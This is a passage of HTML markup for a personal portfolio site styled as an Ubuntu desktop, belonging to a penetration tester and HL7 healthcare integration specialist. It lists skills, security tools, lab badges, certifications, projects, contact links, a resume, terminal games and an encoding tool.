+<div class="stat-label">HIPAA Compliant</div>
+</div>
+<div class="stat-card">
+<div class="stat-number">15+</div>
+<div class="stat-label">Years HL7 Experience</div>
+</div>
+</div>
+
+<div class="tools-grid" style="margin-bottom:32px">
+<div class="tool-card">
+<h4>🏥 Major EMR/EHR Systems</h4>
+<p><strong>Athena Health</strong> • Cerner Millennium • Epic (OCHIN) • NextGen Healthcare • Medisoft • LabSoft • Ellkay • AllScripts • eClinicalWorks • Practice Fusion</p>
+</div>
+<div class="tool-card">
+<h4>🔗 HL7 Integration Protocols</h4>
+<p>HL7 v2.x (ADT, ORM, ORU, DFT, SIU) • HL7 v3 • FHIR (Fast Healthcare Interoperability Resources) • CCD/CCDA • X12 EDI • DICOM • Direct Messaging</p>
+</div>
+<div class="tool-card">
+<h4>⚙️ Integration Engines</h4>
+<p>Mirth Connect • Rhapsody • Cloverleaf • Ensemble • Interface Engines • Custom Middleware Solutions • API Gateways</p>
+</div>
+<div class="tool-card">
+<h4>🔒 Security & Compliance</h4>
+<p>HIPAA Compliance • HL7 Message Encryption • Secure SFTP/VPN Tunneling • PHI Data Protection • Audit Logging • Access Control</p>
+</div>
+<div class="tool-card">
+<h4>🛠️ Custom Integration Solutions</h4>
+<p>Built custom bridges for unique client requirements • Developed specialized parsers for non-standard formats • API integrations with lab systems, pharmacies, and billing platforms</p>
+</div>
+<div class="tool-card">
+<h4>📊 Data Mapping & Transformation</h4>
+<p>Expert in complex data mapping between disparate systems • Message routing and transformation • Format conversion • Segment manipulation • Code set translations</p>
+</div>
+</div>
+
+<div class="lab-card" style="margin-bottom:32px;background:rgba(233,84,32,0.1);border:1px solid rgba(233,84,32,0.4)">
+<h4 style="font-size:16px;margin-bottom:12px">💡 Custom Build Highlights</h4>
+<p style="line-height:1.8">
+Developed custom integration solutions for clients with unique requirements including:
+<br><br>
+• <strong>Custom API Connectors:</strong> Built RESTful and SOAP API bridges for EMRs lacking standard interfaces
+<br>
+• <strong>Legacy System Modernization:</strong> Created middleware to connect outdated systems to modern HL7 infrastructure  
+<br>
+• <strong>Multi-System Orchestration:</strong> Synchronized data across 5+ EMRs simultaneously for large healthcare networks
+<br>
+• <strong>Real-Time Lab Integrations:</strong> Connected reference labs, in-house labs, and point-of-care devices
+<br>
+• <strong>Pharmacy System Integrations:</strong> e-Prescribing (NCPDP SCRIPT), medication reconciliation, formulary checks
+<br>
+• <strong>Billing System Bridges:</strong> Claims submission, eligibility verification, remittance processing
+</p>
+</div>
+
+<h3 class="section-title">🛠️ Tools & Arsenal</h3>
+<div class="tools-grid">
+<div class="tool-card">
+<h4>🔍 Reconnaissance</h4>
+<p>Nmap, Masscan, Amass, Subfinder, HTTPX, Nuclei, DNSRecon, WhatWeb</p>
+</div>
+<div class="tool-card">
+<h4>🕸️ Web Exploitation</h4>
+<p>Burp Suite Pro, OWASP ZAP, SQLMap, XSStrike, Nikto, WPScan, Commix</p>
+</div>
+<div class="tool-card">
+<h4>💉 Post-Exploitation</h4>
+<p>Metasploit, Empire, Covenant, BloodHound, Mimikatz, Rubeus, SharpHound</p>
+</div>
+<div class="tool-card">
+<h4>🔓 Password Attacks</h4>
+<p>Hashcat, John the Ripper, Hydra, Medusa, CrackMapExec, Responder</p>
+</div>
+<div class="tool-card">
+<h4>📡 Network Tools</h4>
+<p>Wireshark, tcpdump, Ettercap, Aircrack-ng, Bettercap, Proxychains</p>
+</div>
+<div class="tool-card">
+<h4>🐚 Custom Scripts</h4>
+<p>Python exploitation scripts, Bash automation, PowerShell payloads, Go tools</p>
+</div>
+</div>
+
+<h3 class="section-title">🎯 Recent Hacking Labs & Challenges</h3>
+<div class="labs-grid">
+<div class="lab-card">
+<h4>🏆 TryHackMe - Red Teaming Path</h4>
+<p>Completed advanced red team operations including Active Directory attacks, lateral movement, and persistence mechanisms.</p>
+<div class="lab-meta">
+<span class="lab-badge">Completed</span>
+<span class="lab-badge">Nov 2025</span>
+</div>
+</div>
+<div class="lab-card">
+<h4>🏆 HackTheBox - Bug Bounty Hunter</h4>
+<p>Advanced web application security testing, API vulnerabilities, and business logic flaws.</p>
+<div class="lab-meta">
+<span class="lab-badge">Ongoing</span>
+<span class="lab-badge">2025</span>
+</div>
+</div>
+<div class="lab-card">
+<h4>🏆 PortSwigger Academy</h4>
+<p>Mastered SQL injection, XSS, CSRF, XXE, SSRF, authentication bypasses, and access control vulnerabilities.</p>
+<div class="lab-meta">
+<span class="lab-badge">All Labs</span>
+<span class="lab-badge">2025</span>
+</div>
+</div>
+<div class="lab-card">
+<h4>🏆 Offensive Security - OSCP Prep</h4>
+<p>Privilege escalation, buffer overflows, and full system compromise on Linux and Windows targets.</p>
+<div class="lab-meta">
+<span class="lab-badge">30+ Boxes</span>
+<span class="lab-badge">Ongoing</span>
+</div>
+</div>
+</div>
+
+<h3 class="section-title">🎓 Certifications</h3>
+<div class="cert-grid">
+<div class="cert-card">
+<div class="cert-icon">🎓</div>
+<div class="cert-name">CCEP</div>
+<div class="cert-issuer">redteamleaders • Nov 2025</div>
+</div>
+<div class="cert-card">
+<div class="cert-icon">🛡️</div>
+<div class="cert-name">Red Teaming</div>
+<div class="cert-issuer">TryHackMe • Nov 2025</div>
+</div>
+<div class="cert-card">
+<div class="cert-icon">🔒</div>
+<div class="cert-name">Pre Security</div>
+<div class="cert-issuer">TryHackMe • Nov 2025</div>
+</div>
+<div class="cert-card">
+<div class="cert-icon">🎯</div>
+<div class="cert-name">Jr Penetration Tester</div>
+<div class="cert-issuer">TryHackMe • Oct 2025</div>
+</div>
+<div class="cert-card">
+<div class="cert-icon">🔐</div>
+<div class="cert-name">Intro to Cybersecurity</div>
+<div class="cert-issuer">IBM • Dec 2024</div>
+</div>
+<div class="cert-card">
+<div class="cert-icon">🛡️</div>
+<div class="cert-name">Foundations of Cybersecurity</div>
+<div class="cert-issuer">Google • Jul 2023</div>
+</div>
+</div>
+</div>
+</div>
+
+
+<!-- Contact Window -->
+<div class="window" id="w-contact" style="top:90px;left:120px;width:700px;height:550px">
+<div class="window-header">
+<div class="window-title">📧 Contact Information</div>
+<div class="window-controls">
+<button class="window-btn btn-minimize" data-close="w-contact"></button>
+<button class="window-btn btn-maximize" data-max="w-contact"></button>
+<button class="window-btn btn-close" data-close="w-contact"></button>
+</div>
+</div>
+<div class="window-content">
+<div class="about-hero" style="margin-bottom:24px">
+<h2>Let's Connect! 🤝</h2>
+<div class="tagline">Always open to collaboration and new opportunities</div>
+</div>
+
+<h3 class="section-title">📬 Get in Touch</h3>
+<div style="display:grid;gap:16px;margin-bottom:32px">
+<div style="display:flex;align-items:center;gap:16px;padding:20px;background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.3);border-radius:12px;cursor:pointer;transition:all 0.2s" onclick="window.open(&quot;mailto:contact@smartysaini.com&quot;,&quot;_blank&quot;)">
+<span style="font-size:32px">📧</span>
+<div>
+<div style="font-weight:600;color:#E95420;font-size:16px">Email</div>
+<div style="color:var(--text);margin-top:4px"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a0d3cdc1d2d4d98ed3c1c9cec9e0c5d8c1cdd0ccc58ec3cfcd">[email&#160;protected]</a></div>
+</div>
+</div>
+<div style="display:flex;align-items:center;gap:16px;padding:20px;background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.3);border-radius:12px;cursor:pointer;transition:all 0.2s" onclick="window.open(&quot;https://linkedin.com/in/smarty-saini&quot;,&quot;_blank&quot;)">
+<span style="font-size:32px">💼</span>
+<div>
+<div style="font-weight:600;color:#E95420;font-size:16px">LinkedIn</div>
+<div style="color:var(--text);margin-top:4px">linkedin.com/in/smarty-saini</div>
+</div>
+</div>
+<div style="display:flex;align-items:center;gap:16px;padding:20px;background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.3);border-radius:12px;cursor:pointer;transition:all 0.2s" onclick="window.open(&quot;https://github.com/smarty-saini&quot;,&quot;_blank&quot;)">
+<span style="font-size:32px">🐙</span>
+<div>
+<div style="font-weight:600;color:#E95420;font-size:16px">GitHub</div>
+<div style="color:var(--text);margin-top:4px">github.com/smarty-saini</div>
+</div>
+</div>
+<div style="display:flex;align-items:center;gap:16px;padding:20px;background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.3);border-radius:12px;cursor:pointer;transition:all 0.2s" onclick="window.open(&quot;https://twitter.com/smarty_saini&quot;,&quot;_blank&quot;)">
+<span style="font-size:32px">𝕏</span>
+<div>
+<div style="font-weight:600;color:#E95420;font-size:16px">Medium</div>
+<div style="color:var(--text);margin-top:4px">https://medium.com/@contact_26633</div>
+</div>
+</div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+
+<!-- Resume Window -->
+<div class="window" id="w-resume" style="top:95px;left:130px;width:750px;height:600px">
+<div class="window-header">
+<div class="window-title">📄 Resume / CV</div>
+<div class="window-controls">
+<button class="window-btn btn-minimize" data-close="w-resume"></button>
+<button class="window-btn btn-maximize" data-max="w-resume"></button>
+<button class="window-btn btn-close" data-close="w-resume"></button>
+</div>
+</div>
+<div class="window-content">
+<div class="about-hero" style="margin-bottom:24px">
+<h2>SmaRTy Saini</h2>
+<div class="tagline">Cybersecurity Professional | Healthcare Integration Specialist</div>
+<div style="margin-top:16px;font-size:14px">
+📧 <a href="mailto:contact@smartysaini.com" style="color:#E95420;text-decoration:none">contact@smartysaini.com</a> | 
+💼 <a href="https://linkedin.com/in/smarty-saini" target="_blank" style="color:#E95420;text-decoration:none">linkedin.com/in/smarty-saini</a> | 
+🐙 <a href="https://github.com/smarty-saini" target="_blank" style="color:#E95420;text-decoration:none">github.com/smarty-saini</a>
+</div>
+</div>
+
+<h3 class="section-title">💼 Professional Summary</h3>
+<p style="line-height:1.8;margin-bottom:24px;color:var(--text-dim)">
+Seasoned cybersecurity professional with 15+ years specializing in penetration testing, red team operations, and security research. Extensive healthcare IT expertise with 1,000+ HL7 integration instances deployed across 40+ EMR/EHR systems. Active CTF player, bug bounty hunter, and HIPAA compliance specialist.
+</p>
+
+<h3 class="section-title">🎯 Core Competencies</h3>
+<div style="display:grid;grid-template-columns:repeat(2,1fr);gap:16px;margin-bottom:24px">
+<div>
+<h4 style="color:#E95420;font-size:14px;margin-bottom:8px">Cybersecurity</h4>
+<ul style="font-size:13px;color:var(--text-dim);line-height:1.8;margin-left:20px">
+<li>Penetration Testing & Red Teaming</li>
+<li>Web Application Security</li>
+<li>Network Security & Exploitation</li>
+<li>Vulnerability Assessment</li>
+<li>Security Research & POC Development</li>
+</ul>
+</div>
+<div>
+<h4 style="color:#E95420;font-size:14px;margin-bottom:8px">Healthcare IT</h4>
+<ul style="font-size:13px;color:var(--text-dim);line-height:1.8;margin-left:20px">
+<li>HL7 v2.x/v3 Integration (1,000+ instances)</li>
+<li>FHIR & CCD/CCDA Implementation</li>
+<li>EMR/EHR Systems (40+ platforms)</li>
+<li>HIPAA Compliance & Security</li>
+<li>Custom Integration Solutions</li>
+</ul>
+</div>
+</div>
+
+<h3 class="section-title">🛠️ Technical Skills</h3>
+<div style="margin-bottom:24px">
+<div style="margin-bottom:12px">
+<strong style="color:#E95420">Security Tools:</strong>
+<span style="color:var(--text-dim);font-size:13px"> Burp Suite Pro, Metasploit, Nmap, SQLMap, Hashcat, Wireshark, BloodHound, Empire, Cobalt Strike</span>
+</div>
+<div style="margin-bottom:12px">
+<strong style="color:#E95420">Integration Engines:</strong>
+<span style="color:var(--text-dim);font-size:13px"> Mirth Connect, Rhapsody, Cloverleaf, Ensemble, Custom Middleware</span>
+</div>
+<div style="margin-bottom:12px">
+<strong style="color:#E95420">Programming:</strong>
+<span style="color:var(--text-dim);font-size:13px"> Python, Bash, PowerShell, JavaScript, Go, C/C++, SQL</span>
+</div>
+<div style="margin-bottom:12px">
+<strong style="color:#E95420">EMR/EHR Systems:</strong>
+<span style="color:var(--text-dim);font-size:13px"> Athena, Cerner, Epic (OCHIN), NextGen, Medisoft, LabSoft, Ellkay, AllScripts, eClinicalWorks</span>
+</div>
+</div>
+
+<h3 class="section-title">🎓 Certifications</h3>
+<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px">
+<div style="padding:12px;background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.2);border-radius:8px;text-align:center">
+<div style="font-size:24px;margin-bottom:8px">🎓</div>
+<div style="font-weight:600;color:#E95420;font-size:13px">CCEP</div>
+<div style="font-size:11px;color:var(--text-dim)">Nov 2025</div>
+</div>
+<div style="padding:12px;background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.2);border-radius:8px;text-align:center">
+<div style="font-size:24px;margin-bottom:8px">🛡️</div>
+<div style="font-weight:600;color:#E95420;font-size:13px">Red Teaming</div>
+<div style="font-size:11px;color:var(--text-dim)">2025</div>
+</div>
+<div style="padding:12px;background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.2);border-radius:8px;text-align:center">
+<div style="font-size:24px;margin-bottom:8px">🔐</div>
+<div style="font-weight:600;color:#E95420;font-size:13px">Bug Bounty</div>
+<div style="font-size:11px;color:var(--text-dim)">2025</div>
+</div>
+</div>
+
+<div style="margin-top:24px;padding:16px;background:rgba(233,84,32,0.1);border:1px solid rgba(233,84,32,0.3);border-radius:8px;text-align:center">
+<button class="encoder-btn" onclick="alert(&quot;Download feature coming soon! Connect with me via the Contact window.&quot;)">📥 Download Full Resume (PDF)</button>
+</div>
+</div>
+</div>
+
+<!-- Games Window -->
+<div class="window" id="w-games" style="top:85px;left:140px;width:650px;height:520px">
+<div class="window-header">
+<div class="window-title">🎮 Terminal Games</div>
+<div class="window-controls">
+<button class="window-btn btn-minimize" data-close="w-games"></button>
+<button class="window-btn btn-maximize" data-max="w-games"></button>
+<button class="window-btn btn-close" data-close="w-games"></button>
+</div>
+</div>
+<div class="window-content">
+<div class="about-hero" style="margin-bottom:24px">
+<h2>🎮 Play Games in Terminal</h2>
+<div class="tagline">Type these commands in the Terminal to play!</div>
+</div>
+
+<div style="display:grid;gap:16px">
+<div style="padding:20px;background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.3);border-radius:12px">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
+<span style="font-size:28px">🎲</span>
+<h4 style="color:#E95420;font-size:16px">guess - Number Guessing Game</h4>
+</div>
+<p style="font-size:13px;color:var(--text-dim);line-height:1.6;margin-bottom:8px">
+Guess a random number between 1-100. The terminal will tell you if your guess is too high or too low!
+</p>
+<code style="font-family:'Ubuntu Mono',monospace;color:#E95420;font-size:12px">$ guess</code>
+</div>
+
+<div style="padding:20px;background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.3);border-radius:12px">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
+<span style="font-size:28px">🧠</span>
+<h4 style="color:#E95420;font-size:16px">trivia - Cybersecurity Trivia</h4>
+</div>
+<p style="font-size:13px;color:var(--text-dim);line-height:1.6;margin-bottom:8px">
+Test your cybersecurity knowledge! Answer random security questions and earn points.
+</p>
+<code style="font-family:'Ubuntu Mono',monospace;color:#E95420;font-size:12px">$ trivia</code>
+</div>
+
+<div style="padding:20px;background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.3);border-radius:12px">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
+<span style="font-size:28px">🔐</span>
+<h4 style="color:#E95420;font-size:16px">hash - Hash Cracker Game</h4>
+</div>
+<p style="font-size:13px;color:var(--text-dim);line-height:1.6;margin-bottom:8px">
+Crack MD5 hashes! The game gives you a hash and you try to guess the original word.
+</p>
+<code style="font-family:'Ubuntu Mono',monospace;color:#E95420;font-size:12px">$ hash</code>
+</div>
+
+<div style="padding:20px;background:rgba(26,31,58,0.4);border:1px solid rgba(233,84,32,0.3);border-radius:12px">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
+<span style="font-size:28px">🚀</span>
+<h4 style="color:#E95420;font-size:16px">space - ASCII Space Shooter</h4>
+</div>
+<p style="font-size:13px;color:var(--text-dim);line-height:1.6;margin-bottom:8px">
+Retro ASCII space shooter game! Avoid asteroids and shoot enemies. Coming soon!
+</p>
+<code style="font-family:'Ubuntu Mono',monospace;color:#E95420;font-size:12px">$ space</code>
+</div>
+</div>
+
+<div style="margin-top:20px;padding:16px;background:rgba(233,84,32,0.1);border:1px solid rgba(233,84,32,0.3);border-radius:8px;text-align:center">
+💡 <strong>Tip:</strong> Open the Terminal app and type any game command to start playing!
+</div>
+</div>
+</div>
+
+<!-- Terminal Window -->
+<div class="window terminal-window" id="w-terminal" style="top:100px;left:150px;width:800px;height:500px">
+<div class="window-header">
+<div class="window-title">💻 Terminal - smarty@ubuntu</div>
+<div class="window-controls">
+<button class="window-btn btn-minimize" data-close="w-terminal"></button>
+<button class="window-btn btn-maximize" data-max="w-terminal"></button>
+<button class="window-btn btn-close" data-close="w-terminal"></button>
+</div>
+</div>
+<div class="window-content" id="terminalOutput">
+<div class="terminal-disclaimer">
+⚠️ DISCLAIMER: This site is a personal portfolio project. All logos, artwork, and assets referenced remain the property of their respective owners. They are included here as inspiration, homage, or parody, not as original creations or with any claim of ownership. This project is independent and has no affiliation with or endorsement from the original creators.
+</div>
+<div class="terminal-line">Welcome to Ubuntu Terminal OS v24.10</div>
+<div class="terminal-line">Type 'help' for available commands</div>
+<div class="terminal-line">Type 'ctf' to start a capture the flag challenge!</div>
+<div class="terminal-line"></div>
+<div class="terminal-input-line">
+<span class="terminal-prompt">smarty@ubuntu:~$</span>
+<input type="text" class="terminal-input" id="terminalInput" autocomplete="off">
+</div>
+</div>
+</div>
+
+<!-- Projects Window -->
+<div class="window" id="w-projects" style="top:120px;left:200px;width:900px;height:600px">
+<div class="window-header">
+<div class="window-title">📁 Projects & Portfolio</div>
+<div class="window-controls">
+<button class="window-btn btn-minimize" data-close="w-projects"></button>
+<button class="window-btn btn-maximize" data-max="w-projects"></button>
+<button class="window-btn btn-close" data-close="w-projects"></button>
+</div>
+</div>
+<div class="window-content">
+<div class="project-grid">
+<div class="project-card">
+<div class="project-header">
+<div class="project-title">Web Scanner Pro</div>
+<div class="project-tag">Security</div>
+</div>
+<div class="project-desc">Automated web application vulnerability scanner with support for OWASP Top 10 detection.</div>
+<div class="project-tech">
+<span class="tech-badge">Python</span>
+<span class="tech-badge">Requests</span>
+<span class="tech-badge">BeautifulSoup</span>
+</div>
+<a href="https://github.com/smarty-saini/web-scanner" class="project-link" target="_blank">View on GitHub →</a>
+</div>
+<div class="project-card">
+<div class="project-header">
+<div class="project-title">CTF Writeups</div>
+<div class="project-tag">Education</div>
+</div>
+<div class="project-desc">Collection of detailed writeups for HackTheBox, TryHackMe, and other CTF challenges.</div>
+<div class="project-tech">
+<span class="tech-badge">Markdown</span>
+<span class="tech-badge">Tutorials</span>
+</div>
+<a href="https://github.com/smarty-saini/ctf-writeups" class="project-link" target="_blank">View on GitHub →</a>
+</div>
+<div class="project-card">
+<div class="project-header">
+<div class="project-title">Recon Automation</div>
+<div class="project-tag">Tool</div>
+</div>
+<div class="project-desc">Bash scripts for automated reconnaissance, subdomain enumeration, and vulnerability scanning.</div>
+<div class="project-tech">
+<span class="tech-badge">Bash</span>
+<span class="tech-badge">Nmap</span>
+<span class="tech-badge">HTTPX</span>
+</div>
+<a href="https://github.com/smarty-saini/recon-auto" class="project-link" target="_blank">View on GitHub →</a>
+</div>
+<div class="project-card">
+<div class="project-header">
+<div class="project-title">Password Generator</div>
+<div class="project-tag">Utility</div>
+</div>
+<div class="project-desc">Cryptographically secure password generator with custom rules and wordlist generation.</div>
+<div class="project-tech">
+<span class="tech-badge">Python</span>
+<span class="tech-badge">Cryptography</span>
+</div>
+<a href="https://github.com/smarty-saini/passgen" class="project-link" target="_blank">View on GitHub →</a>
+</div>
+<div class="project-card">
+<div class="project-header">
+<div class="project-title">Exploit Database</div>
+<div class="project-tag">Research</div>
+</div>
+<div class="project-desc">Personal collection of exploits, POCs, and vulnerability research documentation.</div>
+<div class="project-tech">
+<span class="tech-badge">C</span>
+<span class="tech-badge">Python</span>
+<span class="tech-badge">Assembly</span>
+</div>
+<a href="https://github.com/smarty-saini/exploit-db" class="project-link" target="_blank">View on GitHub →</a>
+</div>
+<div class="project-card">
+<div class="project-header">
+<div class="project-title">API Fuzzer</div>
+<div class="project-tag">Security</div>
+</div>
+<div class="project-desc">REST API fuzzing tool for discovering injection points, authentication bypasses, and IDOR vulnerabilities.</div>
+<div class="project-tech">
+<span class="tech-badge">Go</span>
+<span class="tech-badge">HTTP</span>
+</div>
+<a href="https://github.com/smarty-saini/api-fuzzer" class="project-link" target="_blank">View on GitHub →</a>
+</div>
+</div>
+</div>
+</div>
+
+<!-- Encoder/Decoder Tool Window -->
+<div class="window" id="w-encoder" style="top:140px;left:250px;width:700px;height:550px">
+<div class="window-header">
+<div class="window-title">🔐 Encode/Decode Tool</div>
+<div class="window-controls">
+<button class="window-btn btn-minimize" data-close="w-encoder"></button>
+<button class="window-btn btn-maximize" data-max="w-encoder"></button>
+<button class="window-btn btn-close" data-close="w-encoder"></button>
+</div>
+</div>
+<div class="window-content">
+<div class="encoder-container">
+<div class="encoder-tabs">
+<button class="encoder-tab active" data-tab="base64">Base64</button>
+<button class="encoder-tab" data-tab="url">URL Encode</button>
+<button class="encoder-tab" data-tab="hash">Hash</button>
+<button class="encoder-tab" data-tab="hex">Hex</button>
+</div>
+
+<div class="encoder-section active" id="tab-base64">
+<label style="color:var(--text-dim);font-size:12px;margin-bottom:8px;display:block">Input Text:</label>
+<textarea class="encoder-textarea" id="base64Input" placeholder="Enter text to encode/decode..."></textarea>
+<div class="encoder-buttons">
+<button class="encoder-btn" onclick="encodeBase64()">Encode</button>
+<button class="encoder-btn secondary" onclick="decodeBase64()">Decode</button>
+<button class="encoder-btn secondary" onclick="copyResult(&quot;base64Output&quot;)">Copy Result</button>
+</div>
+<label style="color:var(--text-dim);font-size:12px;margin:16px 0 8px;display:block">Output:</label>
+<textarea class="encoder-textarea" id="base64Output" readonly></textarea>
+</div>
+
+<div class="encoder-section" id="tab-url">
+<label style="color:var(--text-dim);font-size:12px;margin-bottom:8px;display:block">Input Text:</label>
+<textarea class="encoder-textarea" id="urlInput" placeholder="Enter text to encode/decode..."></textarea>
+<div class="encoder-buttons">
+<button class="encoder-btn" onclick="encodeURL()">Encode</button>
+<button class="encoder-btn secondary" onclick="decodeURL()">Decode</button>
+<button class="encoder-btn secondary" onclick="copyResult(&quot;urlOutput&quot;)">Copy Result</button>
+</div>
+<label style="color:var(--text-dim);font-size:12px;margin:16px 0 8px;display:block">Output:</label>
+<textarea class="encoder-textarea" id="urlOutput" readonly></textarea>
+</div>
+
+<div class="encoder-section" id="tab-hash">
+<label style="color:var(--text-dim);font-size:12px;margin-bottom:8px;display:block">Input Text:</label>
+<textarea class="encoder-textarea" id="hashInput" placeholder="Enter text to hash..."></textarea>
+<div class="encoder-buttons">
+<button class="encoder-btn" onclick="hashSHA1()">SHA-1</button>
+<button class="encoder-btn" onclick="hashSHA256()">SHA-256</button>
+<button class="encoder-btn secondary" onclick="copyResult(&quot;hashOutput&quot;)">Copy</button>
+</div>
+<label style="color:var(--text-dim);font-size:12px;margin:16px 0 8px;display:block">Output:</label>
+<textarea class="encoder-textarea" id="hashOutput" readonly></textarea>
+</div>
+
+<div class="encoder-section" id="tab-hex">
+<label style="color:var(--text-dim);font-size:12px;margin-bottom:8px;display:block">Input Text:</label>
+<textarea class="encoder-textarea" id="hexInput" placeholder="Enter text to convert..."></textarea>
+<div class="encoder-buttons">
+<button class="encoder-btn" onclick="toHex()">To Hex</button>
+<button class="encoder-btn secondary" onclick="fromHex()">From Hex</button>
+<button class="encoder-btn secondary" onclick="copyResult(&quot;hexOutput&quot;)">Copy Result</button>
+</div>
+<label style="color:var(--text-dim);font-size:12px;margin:16px 0 8px;display:block">Output:</label>
+<textarea class="encoder-textarea" id="hexOutput" readonly></textarea>
+</div>
+</div>
+</div>
+</div>
+
+<!-- Browser Window -->
+<div class="window" id="w-browser" style="top:80px;left:300px;width:1000px;height:650px">
+<div class="window-header">
+<div class="window-title">🌐 Web Browser</div>
+<div class="window-controls">
+<button class="window-btn btn-minimize" data-close="w-browser"></button>
+<button class="window-btn btn-maximize" data-max="w-browser"></button>
+<button class="window-btn btn-close" data-close="w-browser"></button>
+</div>
+</div>
+<div class="browser-toolbar">
+<button class="browser-btn" id="browserBack">◀</button>
+<button class="browser-btn" id="browserForward">▶</button>
+<button class="browser-btn" id="browserRefresh">↻</button>
+<input type="text" class="browser-url" id="browserURL" placeholder="Enter URL...">
+<button class="browser-btn" id="browserGo">Go</button>
+</div>
+<div style="flex:1;position:relative;background:#fff">
+<div class="browser-loading" id="browserLoading">
+<div class="spinner"></div>
+<div style="color:#666">Loading page...</div>
+</div>
+<div class="browser-error" id="browserError">
+<div style="font-size:48px">⚠️</div>
+<div style="color:#666;text-align:center">
+<h3>Unable to Load Page</h3>
+<p>This page may block embedding or took too long to load.</p>
+<button class="encoder-btn" onclick="openExternal()">Open in New Tab</button>
+</div>
+</div>
+<iframe id="browserFrame" class="browser-frame"></iframe>
+</div>
+</div>
+
+<!-- Files Window -->
+<div class="window" id="w-files" style="top:100px;left:320px;width:700px;height:500px">
+<div class="window-header">
+<div class="window-title">📂 File Manager</div>
+<div class="window-controls">
+<button class="window-btn btn-minimize" data-close="w-files"></button>
+<button class="window-btn btn-maximize" data-max="w-files"></button>
+<button class="window-btn btn-close" data-close="w-files"></button>
+</div>
+</div>
+<div class="window-content">
+<h3 style="color:#E95420;margin-bottom:20px">📁 /home/smarty/</h3>
+<div style="display:grid;gap:12px">
+<div style="display:flex;align-items:center;gap:12px;padding:12px;background:rgba(26,31,58,0.4);border-radius:8px;border:1px solid rgba(233,84,32,0.2)">
+<span style="font-size:32px">📁</span>
+<div>
+<div style="font-weight:600;color:#E95420">Documents</div>
+<div style="font-size:12px;color:var(--text-dim)">Personal documents and files</div>
+</div>
+</div>
+<div style="display:flex;align-items:center;gap:12px;padding:12px;background:rgba(26,31,58,0.4);border-radius:8px;border:1px solid rgba(233,84,32,0.2)">
+<span style="font-size:32px">📁</span>
+<div>
+<div style="font-weight:600;color:#E95420">Projects</div>
+<div style="font-size:12px;color:var(--text-dim)">Development projects and code</div>
+</div>
+</div>
+<div style="display:flex;align-items:center;gap:12px;padding:12px;background:rgba(26,31,58,0.4);border-radius:8px;border:1px solid rgba(233,84,32,0.2)">
+<span style="font-size:32px">📁</span>
+<div>
+<div style="font-weight:600;color:#E95420">Downloads</div>
+<div style="font-size:12px;color:var(--text-dim)">Downloaded files</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<!-- Settings Window -->
+<div class="window" id="w-settings" style="top:120px;left:340px;width:600px;height:450px">
+<div class="window-header">
+<div class="window-title">⚙️ System Settings</div>
+<div class="window-controls">
+<button class="window-btn btn-minimize" data-close="w-settings"></button>
+<button class="window-btn btn-close" data-close="w-settings"></button>
+</div>
+</div>
+<div class="window-content">
+<h3 style="color:#E95420;margin-bottom:20px">⚙️ System Preferences</h3>
+<div style="display:grid;gap:16px">
+<div style="display:flex;justify-content:space-between;align-items:center;padding:16px;background:rgba(26,31,58,0.4);border-radius:8px;border:1px solid rgba(233,84,32,0.2)">
+<div>
+<div style="font-weight:600;color:var(--text);font-size:14px">🔊 Sound Effects</div>
+<div style="font-size:12px;color:var(--text-dim)">Enable beep sounds for actions</div>
+</div>
+<label style="position:relative;display:inline-block;width:48px;height:24px">
+<input type="checkbox" id="soundToggle" checked style="opacity:0;width:0;height:0">
+<span class="toggle-switch" data-toggle="soundToggle" style="position:absolute;cursor:pointer;inset:0;background:rgba(233,84,32,0.5);border-radius:24px;transition:0.3s"></span>
+</label>
+</div>
+
+<div style="display:flex;justify-content:space-between;align-items:center;padding:16px;background:rgba(26,31,58,0.4);border-radius:8px;border:1px solid rgba(233,84,32,0.2)">
+<div>
+<div style="font-weight:600;color:var(--text);font-size:14px">🌊 Auto-hide Dock</div>
+<div style="font-size:12px;color:var(--text-dim)">Dock slides down when not hovering</div>
+</div>
+<label style="position:relative;display:inline-block;width:48px;height:24px">
+<input type="checkbox" id="dockToggle" style="opacity:0;width:0;height:0">
+<span class="toggle-switch" data-toggle="dockToggle" style="position:absolute;cursor:pointer;inset:0;background:rgba(233,84,32,0.3);border-radius:24px;transition:0.3s"></span>
+</label>
+</div>
+
+<div style="display:flex;justify-content:space-between;align-items:center;padding:16px;background:rgba(26,31,58,0.4);border-radius:8px;border:1px solid rgba(233,84,32,0.2)">
+<div>
+<div style="font-weight:600;color:var(--text);font-size:14px">📢 Notifications</div>
+<div style="font-size:12px;color:var(--text-dim)">Show popup notifications</div>
+</div>
+<label style="position:relative;display:inline-block;width:48px;height:24px">
+<input type="checkbox" id="notifToggle" checked style="opacity:0;width:0;height:0">
+<span class="toggle-switch" data-toggle="notifToggle" style="position:absolute;cursor:pointer;inset:0;background:rgba(233,84,32,0.5);border-radius:24px;transition:0.3s"></span>
+</label>
+</div>
+
+<div style="padding:16px;background:rgba(26,31,58,0.4);border-radius:8px;border:1px solid rgba(233,84,32,0.2)">
+<div style="font-weight:600;color:var(--text);font-size:14px;margin-bottom:12px">🎨 Terminal Font Size</div>
+<input type="range" id="fontSizeSlider" min="12" max="20" value="14" style="width:100%;accent-color:#E95420">
+<div style="font-size:12px;color:var(--text-dim);margin-top:8px">Current: <span id="fontSizeValue">14</span>px</div>
+</div>
+
+<div style="padding:16px;background:rgba(26,31,58,0.4);border-radius:8px;border:1px solid rgba(233,84,32,0.2)">
+<div style="font-weight:600;color:var(--text);font-size:14px;margin-bottom:12px">ℹ️ System Information</div>
+<div style="font-size:13px;color:var(--text-dim);line-height:1.8">
